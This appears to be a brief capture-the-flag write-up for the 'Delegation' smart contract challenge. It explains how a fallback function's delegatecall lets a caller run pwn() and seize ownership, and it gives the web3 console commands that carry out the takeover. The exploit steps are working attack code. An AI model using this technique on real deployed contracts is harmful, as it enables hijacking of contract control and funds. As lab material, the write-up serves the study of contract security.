# Delegation

## Description

The fallback function makes a `delegatecall(msg.data)` to the contract we want
to hack. Because this other contract has a function `pwn()` that changes who the
owner is, we just need to activate the fallback function by sending a
transaction with this function signature encoded.

## Command Sequence

```
> const encodedFunction = web3.eth.abi.encodeFunctionSignature("pwn()")
> sendTransaction({from: player, to: instance, data: encodedFunction.slice(2)})
> await contract.owner()
we are now the owner
```
